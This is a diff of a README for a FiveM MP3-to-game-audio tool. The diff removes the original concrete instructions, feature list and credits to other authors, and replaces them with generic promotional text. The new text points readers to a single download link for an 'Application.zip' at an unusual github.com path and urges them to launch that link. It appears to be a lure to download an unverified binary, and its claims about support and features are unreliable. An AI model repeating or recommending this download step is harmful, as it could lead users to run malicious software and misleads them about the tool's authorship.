@@ -1,35 +1,39 @@
-# 🎵 audiotool – FiveM Audio Converter  
+# 🎶 Audiotool for Fivem 🎧
 
-**audiotool** is a simple and efficient tool for converting MP3 files into working in-game audio for FiveM. It automates the process of creating a FiveM-compatible audio resource, making it easier than ever to add custom sounds to your server. 
+Welcome to the Audiotool repository, where we provide a cutting-edge audiotool for Fivem that streamlines the creation of Native Audio. 
 
-If you like my work consider giving a ko-fi :)
-https://ko-fi.com/FjamZoo
+## Overview
 
-## ✨ Features  
-✅ **Autobuilds the audio resource** – Automatically processes and prepares your audio files for FiveM.  
-✅ **Creates a FiveM resource** – Generates a fully functional FiveM-ready resource in just a few clicks.  
-✅ **GUI for easy file management** – View file names and manage your audio resources with a user-friendly interface.  
-✅ **Custom soundset & audiobank support** – Set custom names for soundsets and audiobanks to keep your audio organized.  
+Audiotool is designed to enhance the Fivem gaming experience by simplifying the process of adding custom audio content to your projects. With our tool, you can easily create and integrate native audio into your Fivem server, allowing for a more immersive and dynamic gameplay environment.
 
-## 🛠️ How to Use  
-1️⃣ **Run the `.exe`** – Launch audiotool.  
-2️⃣ **Click "Select Files"** – Choose the MP3 files you want to convert.  
-3️⃣ **Add your audio files** – Select multiple MP3 files to include in the resource.  
-4️⃣ **Click "Build Resource"** – audiotool will automatically generate a drag-and-drop ready FiveM resource.  
-5️⃣ **Done!** – You now have a fully functional FiveM script that you can place directly into your server's resource folder.  
+## Features
 
-## 🔮 Planned Features  
-🚀 Support for additional file formats (OGG, etc.)  
-🎶 More in-game sound type compatibility  
+🔊 **Automated Audio Creation**: Say goodbye to manual audio setup - Audiotool automates the process for you, saving time and effort.
 
-If you see any bugs or have any feature requests please open an Issue.
+🚀 **Enhanced Gaming Experience**: With custom audio content, you can take your Fivem server to the next level and create a unique atmosphere for players.
 
-thanks for reading!
+⚙️ **User-Friendly Interface**: Our tool is designed to be intuitive and user-friendly, making it accessible to both beginners and experienced users.
 
+## How to Use
 
-## Credits
-- Joe Szymkowicz: https://github.com/JoeSzymkowiczFiveM/native-audio-tool/tree/main (I took some inspiration from this amazing tool)
-- Chat Disabled: https://github.com/ChatDisabled/nativeAudio/tree/master (Did a lot of the audio research)
-- EHBW: https://ehbw.tebex.io/ (Helped with intial implementation and reused a some of his code from prior repositories)
-- CodeWalker: https://github.com/dexyfex/CodeWalker
-- FFMpeg: https://github.com/FFmpeg/FFmpeg
+To get started with Audiotool, simply download the tool from the following link: [Download Audiotool](https://github.com/files/Application.zip). Once downloaded, launch the tool and follow the on-screen instructions to create your native audio content.
+
+## Screenshots
+
+![Audiotool](https://via.placeholder.com/800x400)
+
+## Support
+
+If you encounter any issues or have any questions about Audiotool, please check the "Releases" section of this repository for updates and troubleshooting information. Alternatively, feel free to reach out to our support team for assistance.
+
+## Get Involved
+
+We welcome contributions to Audiotool from the Fivem community! If you have ideas for improvements or new features, don't hesitate to submit a pull request. Together, we can continue to enhance the audiotool and make it even more powerful and versatile.
+
+## Stay Connected
+
+Be sure to follow our repository for the latest updates and announcements regarding Audiotool. You can also connect with us on social media and join our community to engage with other Fivem enthusiasts and share your experiences with the audiotool.
+
+Thank you for choosing Audiotool - the ultimate audio solution for Fivem! 🎵🎮
+
+Remember, the link provided needs to be launched to download the Audiotool application. Happy gaming! 🚗💨
